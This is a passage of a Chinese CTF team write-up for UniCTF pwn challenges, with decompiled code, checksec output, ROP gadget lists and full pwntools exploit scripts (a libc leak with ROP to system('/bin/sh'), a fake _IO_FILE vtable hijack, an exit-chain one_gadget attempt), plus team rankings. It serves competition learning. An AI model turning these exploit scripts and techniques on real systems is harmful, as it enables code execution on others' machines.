0x00000000004017c4: endbr64; sub rsp, 8; add rsp, 8; ret; 
0x0000000000401000: endbr64; sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; 
0x00000000004011c0: endbr64; ret; 
0x00000000004011b5: hlt; nop word ptr cs:[rax + rax]; endbr64; ret; 
0x000000000040169c: iretd; syscall; 
0x0000000000401746: iretd; syscall; leave; ret; 
0x000000000040169c: iretd; syscall; nop; pop rbp; ret; 
0x0000000000401399: leave; ret; 
0x00000000004015eb: nop; pop rbp; ret; 
0x00000000004011ef: nop; ret; 
0x000000000040101a: ret; 
0x000000000040169d: syscall; 
0x0000000000401747: syscall; leave; ret; 
0x000000000040169d: syscall; nop; pop rbp; ret;
```

**分析**

- `mov edi, 0x4043c0; jmp rax;`看起来能用，但是这里没有给`rax`赋值的指令，扔由`rax`跳会报段错误
- `mov rcx, qword ptr [rbp - 8]; lea rsi, [rbp - 0x20]; lea rdx, [rbp - 0x28]; mov rdi, rcx; syscall;`这条是后门函数的执行`syscall`的汇编指令，看起来不太能用，因为这条给`rdi`传的是`rbp`的地址的数据值，但我们可以在间接法之上再次间接，用`pop rbp ret`给`rbp`传`rbp`的地址，然后再给`rbp`传一次`rbp`的地址，最后给`rbp`传`bss`段的地址，这也就能修改`rbp`的数据值为`bss`段的地址，进而能够修改`rdi`的地址为`bss`段的地址

#### 题目答案

**最终脚本**

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("nc1.ctfplus.cn", 26288)
# r = process(["./pwn"])
elf = ELF("./pwn")
rop = ROP([elf])

# gdb.attach(r, "b *0x401778")

r.sendline()

wutihave_elf_addr = elf.sym["wutihave"]
leimicc_elf_addr = elf.sym["leimicc"]

pop_rbp_ret_elf_addr = rop.find_gadget(["pop rbp", "ret"])[0]
mov_rbp_value_rdi_elf_addr = 0x40168e

bss_elf_addr = elf.bss()

gets_elf_addr = elf.sym["gets"]

file_name = "flag_cda2e1974c7f9dfd3698e39d486634c9"

# payload = p64(wutihave_elf_addr)
payload = p64(pop_rbp_ret_elf_addr) * 2
payload += p64(pop_rbp_ret_elf_addr) + p64(bss_elf_addr - 0x8) + p64(mov_rbp_value_rdi_elf_addr) + p64(0xdeadbeef) + p64(gets_elf_addr)
payload += p64(pop_rbp_ret_elf_addr) + p64(bss_elf_addr - 0x8) + p64(mov_rbp_value_rdi_elf_addr) + p64(0xdeadbeef) + p64(leimicc_elf_addr)
r.sendlineafter("\x1b[0m".encode(), payload)

time.sleep(1)
r.sendline(file_name.encode() + '\x00'.encode())

r.interactive()
r.close()
```

```shell
[*] Switching to interactive mode
UniCTF{♫♫♫nEv3R_G0nN4_q1v3_Y0u_Up♪♪♪N3V3r_G0NnA_L37_g3t$_D0vvn♫♫♫182008503061168787456}
[*] Got EOF while reading in interactive
```

**得到：UniCTF{♫♫♫nEv3R_G0nN4_q1v3_Y0u_Up♪♪♪N3V3r_G0NnA_L37_g3t$_D0vvn♫♫♫182008503061168787456}**



# Day5

## Pwn

### shadow(probie)**(尝试)**

#### 题目信息

> 作者 0xa6 
>
> 18 队已解出本题
>
> # shadow
>
> - 541分
> - 动态环境
> - Pwn
> - 中等
>
> Shadow?!!!

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'/home/kali/Desktop/ctf/debug'
    SHSTK:      Enabled
    IBT:        Enabled
```

**分析**

- Linux64位小端序
- PIE
- GOT表不可写
- NX

**查看源码**

```c
// positive sp value has been detected, the output may be wrong!
void __fastcall __noreturn start(__int64 a1, __int64 a2, void (*a3)(void))
{
  __int64 v3; // rax
  int v4; // esi
  __int64 v5; // [rsp-8h] [rbp-8h] BYREF
  char *retaddr; // [rsp+0h] [rbp+0h] BYREF

  v4 = v5;
  v5 = v3;
  _libc_start_main(main, v4, &retaddr, 0LL, 0LL, a3, &v5);
  __halt();
}
```

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  void *retaddr; // [rsp+8h] [rbp+8h]

  sub_1229(a1, a2, a3);
  signal(11, handler);
  qword_4050 = (__int64)mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);
  if ( qword_4050 == -1 )
    return 1LL;
  *(_QWORD *)(qword_4050 + 8LL * dword_4058++) = retaddr;
  if ( dword_4058 > 256 )
    exit(-1);
  sub_1460();
  qword_4060 = *(_QWORD *)(8LL * --dword_4058 + qword_4050);
  qword_4068 = (__int64)retaddr;
  if ( (void *)qword_4060 != retaddr )
    retaddr = (void *)qword_4060;
  return 0LL;
}
```

```c
int sub_1229()
{
  __int64 v0; // r9
  __int64 v2; // [rsp+0h] [rbp-60h] BYREF
  __int16 v3; // [rsp+10h] [rbp-50h] BYREF
  char v4; // [rsp+12h] [rbp-4Eh]
  char v5; // [rsp+13h] [rbp-4Dh]
  int v6; // [rsp+14h] [rbp-4Ch]
  __int16 v7; // [rsp+18h] [rbp-48h]
  char v8; // [rsp+1Ah] [rbp-46h]
  char v9; // [rsp+1Bh] [rbp-45h]
  int v10; // [rsp+1Ch] [rbp-44h]
  __int16 v11; // [rsp+20h] [rbp-40h]
  char v12; // [rsp+22h] [rbp-3Eh]
  char v13; // [rsp+23h] [rbp-3Dh]
  int v14; // [rsp+24h] [rbp-3Ch]
  __int16 v15; // [rsp+28h] [rbp-38h]
  char v16; // [rsp+2Ah] [rbp-36h]
  char v17; // [rsp+2Bh] [rbp-35h]
  int v18; // [rsp+2Ch] [rbp-34h]
  __int16 v19; // [rsp+30h] [rbp-30h]
  char v20; // [rsp+32h] [rbp-2Eh]
  char v21; // [rsp+33h] [rbp-2Dh]
  int v22; // [rsp+34h] [rbp-2Ch]
  __int16 v23; // [rsp+38h] [rbp-28h]
  char v24; // [rsp+3Ah] [rbp-26h]
  char v25; // [rsp+3Bh] [rbp-25h]
  int v26; // [rsp+3Ch] [rbp-24h]
  __int16 v27; // [rsp+40h] [rbp-20h]
  char v28; // [rsp+42h] [rbp-1Eh]
  char v29; // [rsp+43h] [rbp-1Dh]
  int v30; // [rsp+44h] [rbp-1Ch]
  __int16 v31; // [rsp+48h] [rbp-18h]
  char v32; // [rsp+4Ah] [rbp-16h]
  char v33; // [rsp+4Bh] [rbp-15h]
  int v34; // [rsp+4Ch] [rbp-14h]
  __int16 v35; // [rsp+50h] [rbp-10h]
  char v36; // [rsp+52h] [rbp-Eh]
  char v37; // [rsp+53h] [rbp-Dh]
  int v38; // [rsp+54h] [rbp-Ch]
  __int16 v39; // [rsp+58h] [rbp-8h]
  char v40; // [rsp+5Ah] [rbp-6h]
  char v41; // [rsp+5Bh] [rbp-5h]
  int v42; // [rsp+5Ch] [rbp-4h]

  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  v3 = 32;
  v4 = 0;
  v5 = 0;
  v6 = 4;
  v7 = 21;
  v8 = 0;
  v9 = 7;
  v10 = -1073741762;
  v11 = 32;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 53;
  v16 = 0;
  v17 = 1;
  v18 = 0x40000000;
  v19 = 21;
  v20 = 0;
  v21 = 4;
  v22 = -1;
  v23 = 21;
  v24 = 2;
  v25 = 0;
  v26 = 59;
  v27 = 21;
  v28 = 1;
  v29 = 0;
  v30 = 322;
  v31 = 6;
  v32 = 0;
  v33 = 0;
  v34 = 2147418112;
  v35 = 6;
  v36 = 0;
  v37 = 0;
  v38 = 327681;
  v39 = 6;
  v40 = 0;
  v41 = 0;
  v42 = 0;
  LOWORD(v2) = 10;
  prctl(38, 1LL, 0LL, 0LL, 0LL, v0, v2, &v3);
  return prctl(22, 2LL, &v2);
}
```

```c
void handler()
{
  _BYTE buf[16]; // [rsp+10h] [rbp-10h] BYREF
  void *retaddr; // [rsp+28h] [rbp+8h]

  *(_QWORD *)(qword_4050 + 8LL * dword_4058++) = retaddr;
  if ( dword_4058 > 256 )
    exit(-1);
  read(0, buf, 0x120uLL);
  qword_4060 = *(_QWORD *)(8LL * --dword_4058 + qword_4050);
  qword_4068 = (__int64)retaddr;
  if ( (void *)qword_4060 != retaddr )
    retaddr = (void *)qword_4060;
}
```

```c
void *sub_1460()
{
  void *result; // rax
  char s[8]; // [rsp+8h] [rbp-8h] BYREF
  void *retaddr; // [rsp+18h] [rbp+8h]

  *(_QWORD *)(qword_4050 + 8LL * dword_4058++) = retaddr;
  if ( dword_4058 > 256 )
    exit(-1);
  memset(s, 0, sizeof(s));
  sub_1393();
  read(0, s, 8uLL);
  printf("%.8s", s);
  qword_4060 = *(_QWORD *)(8LL * --dword_4058 + qword_4050);
  qword_4068 = (__int64)retaddr;
  result = retaddr;
  if ( (void *)qword_4060 != retaddr )
  {
    result = (void *)qword_4060;
    retaddr = (void *)qword_4060;
  }
  return result;
}
```

**分析**

- `handle`函数存在栈溢出，我们可以利用这个覆盖`rbp`的低地址为`printf`在`got`表中的低地址`+0x8`
- 使`printf`泄露出`got`的地址数据值
- 进而模糊计算得到`libc`的基地址
- 再利用栈结构原因得到的栈溢出执行`rop`

**数据搜集**

```shell
objdump -d pwn | grep "printf"
```

```shell
00000000000010e0 <printf@plt>:
    1504:       e8 d7 fb ff ff          call   10e0 <printf@plt>
```

```shell
readelf -s libc.so.6 | grep "printf"
```

```shell
2611: 0000000000060100   204 FUNC    GLOBAL DEFAULT   17 printf@@GLIBC_2.2.5
```

```shell
ropper -f libc.so.6 --search "pop rdi; ret;"
```

```shell
0x000000000010f78b: pop rdi; ret;
```

```shell
ropper -f libc.so.6 --search "ret;"
```

```shell
0x000000000002882f: ret;
```

#### 题目答案

**最终脚本**

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

while True:

    # r = remote("nc1.ctfplus.cn", 42124)
    r = process(["./pwn"])

    # libc = ELF("./libc.so.6")
    # elf = ELF("./pwn")
    # rop = ROP([elf])

    # gdb.attach(r)

    payload = cyclic(0x10)
    payload += p16(0x10e0 + 0x8) # 覆盖rbp低位地址为printf@got的低位地址+8即0x10e8,使下一次read的buf的rsi为rbp-8即0x10e0
    r.send(payload)

    payload = p8(0x01) # printf在libc的偏移量为0x60100,覆盖低位地址为原本的0x00,但0x00会截断printf的输出所以这里用0x01
    r.send(payload)

    printf_libc_leak_addr = u64(r.recvuntil('\x7f'.encode(), timeout = 0.1).ljust(8, '\x00'.encode())) - 0x1
    print("==================================================")
    print("printf_libc_leak_addr", hex(printf_libc_leak_addr))

    libc_base_leak_addr = printf_libc_leak_addr - 0x60100
    print("libc_base_leak_addr", hex(libc_base_leak_addr))
    print("==================================================")

    if str(hex(libc_base_leak_addr)).endswith("000"):
        pop_rdi_ret_libc_offset = 0x10f78b
        pop_rdi_ret_libc_addr = libc_base_leak_addr + pop_rdi_ret_libc_offset
        ret_libc_offset = 0x2882f
        ret_libc_addr = libc_base_leak_addr + ret_libc_offset

        bin_sh_libc_offset = 0x1cb42f
        bin_sh_libc_addr = libc_base_leak_addr + bin_sh_libc_offset
        system_libc_offset = 0x58750
        system_libc_addr = libc_base_leak_addr + system_libc_offset

        payload = cyclic(0x10) # 待定
        payload += p64(0xdeadbeef)
        payload += p64(pop_rdi_ret_libc_addr) + p64(bin_sh_libc_addr) + p64(ret_libc_addr) + p64(system_libc_addr)
        r.send(payload)

        r.sendline("ls".encode())
        print(r.recv(1024, timeout = 1))
        r.sendline("ls /".encode())
        print(r.recv(1024, timeout = 1))
        r.sendline("cat flag".encode())
        print(r.recv(1024, timeout = 1))
        r.sendline("cat /flag".encode())
        print(r.recv(1024, timeout = 1))
        r.sendline("env".encode())
        print(r.recv(1024, timeout = 1))

    r.close()
```

```shell

```

得到：UniCTF{}



# Day6

## Pwn

### EZIO(probie)

#### 题目信息

> 作者 lhfff 
>
> 45 队已解出本题
>
> # EZIO
>
> - 199分
> - 动态环境
> - Pwn
> - 简单
>
> 我喜欢清纯的。

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/ezio/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fc000)
    RUNPATH:    b'/home/kali/Desktop/ctf/pwn/2.23-0ubuntu11.3_amd64'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

**分析**

- Linux64位小端序
- NX

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  buf[0] = (char *)getshell;
  fp = (FILE *)buf;
  read(0, buf, 0x820uLL);
  fclose(fp);
  return 0;
}
```

```shell
void __cdecl getshell()
{
  system("cat /data/flag");
}
```

```assembly
.bss:0000000000404060                 public buf
.bss:0000000000404060 ; char *buf[256]
.bss:0000000000404060 buf             dq 100h dup(?)          ; DATA XREF: main+F↑w
.bss:0000000000404060                                         ; main+16↑o ...
.bss:0000000000404860                 public fp
.bss:0000000000404860 ; FILE *fp
.bss:0000000000404860 fp              dq ?                    ; DATA XREF: main+1D↑w
.bss:0000000000404860                                         ; main+42↑r
```

```assembly
.text:00000000004011CE                 public getshell
.text:00000000004011CE getshell        proc near               ; DATA XREF: main+8↑o
.text:00000000004011CE ; __unwind {
.text:00000000004011CE                 endbr64
.text:00000000004011D2                 push    rbp
.text:00000000004011D3                 mov     rbp, rsp
.text:00000000004011D6                 lea     rax, command    ; "cat /data/flag"
.text:00000000004011DD                 mov     rdi, rax        ; command
.text:00000000004011E0                 call    _system
.text:00000000004011E5                 nop
.text:00000000004011E6                 pop     rbp
.text:00000000004011E7                 retn
.text:00000000004011E7 ; } // starts at 4011CE
.text:00000000004011E7 getshell        endp
```

**分析**

- `read(0, buf, 0x820uLL)`存在栈溢出可覆盖指针`fp`
- `fp`是一个FILE结构体，其`__finish`指针指向的地址在`fp`被调用`fclose()`时会被回调
- 我们可以将**buf**伪造成一个FILE结构体即伪造**_IO_FILE 结构体** 和 **_IO_jump_t 虚表**，然后将**__finish**指向的地址改为**getshell**的地址，接着将**fp**指向我们伪造的**buf**，即可实现**劫持IO流**中的**FILE结构体**

**参考文献**

```shell
https://xz.aliyun.com/news/5139
```

| 偏移                                                         | 字段名             | 赋值内容                     | 必须满足的原因                                               |
| ------------------------------------------------------------ | ------------------ | ---------------------------- | ------------------------------------------------------------ |
| 0x00                                                         | flags              | 0xfbad1800                   | glibc内置的“有效魔术值”，包含 _IO_MAGIC 标志，告诉fclose“这是一个合法的文件结构体” |
| 0x20                                                         | _IO_write_base     | 0x1（任意小于0x2的值）       | fclose会检查“写缓冲区是否有数据”，需满足 _IO_write_base < _IO_write_ptr |
| 0x28                                                         | _IO_write_ptr      | 0x2（任意大于0x1的值）       | 同上，配合 _IO_write_base 满足“有未写入的数据”，让fclose执行后续逻辑 |
| 0x38                                                         | _IO_buf_base       | buf_addr + 0x100（非空地址） | 缓冲区起始地址，必须非空（NULL会让fclose直接崩溃）           |
| 0x40                                                         | _IO_buf_end        | buf_addr + 0x200（非空地址） | 缓冲区结束地址，必须非空，且大于 _IO_buf_base                |
| 0x88                                                         | _IO_lock           | buf_addr + 0x300（非空地址） | 文件锁指针，glibc 2.23必须非空（之前的段错误就是因为这里填了0，导致访问[0+8]崩溃） |
| 0xd8                                                         | vtable（虚表指针） | 伪造虚表的地址（buf内地址）  | 指向我们伪造的虚表，让fclose能找到 __finish 函数             |
| 其他字段（如 _IO_read_ptr、_IO_chain 等）：直接填0即可，不影响核心检查。 |                    |                              |                                                              |

#### 题目答案

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
context.log_level = "debug"

r = remote("nc1.ctfplus.cn", 45878)
# r = process(["./pwn"])

# gdb.attach(r, "b *0x4011B3")

IO_FILE_flag = 0xfbad1800

buf_elf_addr = 0x404060
backdoor_elf_addr = 0x4011D2

vtable_offset = 0xd8
vtable_addr = buf_elf_addr + vtable_offset + 8

fp_offset = 0x800

io_buf_base = buf_elf_addr + 0x100
io_buf_end = buf_elf_addr + 0x200

io_lock = buf_elf_addr + 0x300

payload_file = p64(IO_FILE_flag) # flags
payload_file += p64(0x0) * 3
payload_file += p64(0x1) # _IO_write_base
payload_file += p64(0x2) # _IO_write_ptr
payload_file += p64(0x0) * 1
payload_file += p64(io_buf_base) # _IO_buf_base
payload_file += p64(io_buf_end) # _IO_buf_end
payload_file += p64(0x0) * 5
payload_file += p64(1) # _IO_fileno
payload_file += p64(0x0) * 2
payload_file += p64(io_lock) # _IO_lock
payload_file += p64(0x0) * 9
payload_file += p64(vtable_addr) # _IO_jump_t

payload_jump_t = p64(0x0) # __dummy1
payload_jump_t += p64(0x0) # __dummy2
payload_jump_t += p64(backdoor_elf_addr) # __finish
payload_jump_t += p64(0x0) * 20

payload = payload_file + payload_jump_t
payload = payload.ljust(fp_offset, '\x00'.encode())
payload += p64(buf_elf_addr)
payload = payload.ljust(0x820, '\x00'.encode())

r.send(payload)

r.interactive()
```

```shell
[*] Switching to interactive mode
[DEBUG] Received 0x2d bytes:
    b'UniCTF{e16516bb-24c7-48f6-900f-be2baa51229f}\n'
UniCTF{e16516bb-24c7-48f6-900f-be2baa51229f}
[DEBUG] Received 0x4f bytes:
    b"*** Error in `/home/ctf/EzIO': free(): invalid pointer: 0x0000000000404060 ***\n"
*** Error in `/home/ctf/EzIO': free(): invalid pointer: 0x0000000000404060 ***
[*] Got EOF while reading in interactive
```

**得到：UniCTF{e16516bb-24c7-48f6-900f-be2baa51229f}**



### 简单的pwn(probie)**(尝试)**

#### 题目信息

> 作者 imNOgay 
>
> 24 队已解出本题
>
> # 简单的pwn
>
> - 453分
> - Pwn
> - 动态环境
> - 中等
>
> 签到pwn

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'/home/kali/Desktop/ctf/debug'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```shell
sudo ./libc.so.6
```

```shell
GNU C Library (Debian GLIBC 2.41-9) stable release version 2.41.
Copyright (C) 2025 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 14.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
Minimum supported kernel: 3.2.0
For bug reporting instructions, please see:
<http://www.debian.org/Bugs/>.
```

**分析**

- Linux64位小端序
- 保护全开
- libc版本很新是去年的`libc@2.41-9`

**查看源码**

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  g1();
}
```

```c
// positive sp value has been detected, the output may be wrong!
void __noreturn g1()
{
  __int64 buf; // [rsp+8h] [rbp-18h] BYREF
  _QWORD v1[2]; // [rsp+10h] [rbp-10h] BYREF

  v1[1] = __readfsqword(0x28u);
  v1[0] = 0LL;
  buf = 0LL;
  read(0, &buf, 8uLL);
  write(1, (char *)v1 + buf, 5uLL);
  g2();
}
```

```c
void __noreturn g2()
{
  read(0, &ptr, 8uLL);
  read(0, ptr, 0xC0uLL);
  exit(0);
}
```

**分析**

- `main`函数初始化
- `g1`泄露地址的数据值
- `g2`任意地址写
- 我们的目标是劫持exit调用链中的可写区域为onegadget

#### 题目答案

**最终脚本**

```python
from pwn import *

# r = remote("nc1.ctfplus.cn", 42412)
r = process(["./pwn"])

gdb.attach(r, "b main")

offset = 0x7fffffffdde8 - 0x7fffffffdd20

payload = p64(offset)
r.send(payload)

libc_start_main_elf_addr = int("0x7f" + str(hex(u64(r.recv(5).strip().ljust(8, '\x00'.encode())))).replace("0x", ''), 16) - 133
libc_start_main_elf_offset = 0x29ce0
libc_base_addr = libc_start_main_elf_addr - libc_start_main_elf_offset
print("libc_base_addr", hex(libc_base_addr))

# rtld_global_libc_offset = 0x236000
# rtld_global_libc_addr = libc_base_addr + rtld_global_libc_offset
# dl_tls_dtv_slotinfo_list_libc_offset = 0x1f6db0
# dl_tls_dtv_slotinfo_list_libc_addr = libc_base_addr + dl_tls_dtv_slotinfo_list_libc_offset

IO_file_jumps_libc_offset = 0x1e84c0
IO_file_jumps_libc_addr = libc_base_addr + IO_file_jumps_libc_offset
print("IO_file_jumps_libc_addr", hex(IO_file_jumps_libc_addr))
IO_file_flush_libc_offset = 0x1e5fd0 + 0x18
IO_file_flush_libc_addr = IO_file_jumps_libc_addr + IO_file_flush_libc_offset
print("IO_file_flush_libc_addr", hex(IO_file_flush_libc_addr))

one_gadget_libc_offset = [0xddf43, 0xfb062, 0xfb06a, 0xfb06f]
one_gadget_libc_addr = libc_base_addr + one_gadget_libc_offset[3]
print("one_gadget_libc_addr", hex(one_gadget_libc_addr))

payload = p64(IO_file_flush_libc_addr)
r.send(payload) # 修改 &ptr

payload = p64(one_gadget_libc_addr)
payload += b'\x00' * (0xC0 - 8)
r.send(payload) # 修改 ptr

r.interactive()
```

```shell

```

得到：UniCTF{}



# 团队

## 团队名称

**pkfc 柿子哥vivo50**



## 团队口号

**pkfc 柿子哥vivo50**



## 团队成员

### 队长

- **CQ_**

### 队员

- **kine**
- **Atroot.fliaz**
- **BProbie**



## 成员留言

### **CQ_**

- **逆向学得好 牢饭吃到饱**

### **kine**

- **这个人很懒，还没有编写个人简介**

### **Atroot.fliaz**

- **这个人很懒，还没有编写个人简介**

### **BProbie**

- **这个人很懒，还没有编写个人简介**



## 团队成果

### 排名

- **27 / 1194**

### 解题

- **39 / 62**

### 分数

- **7254 / 17639**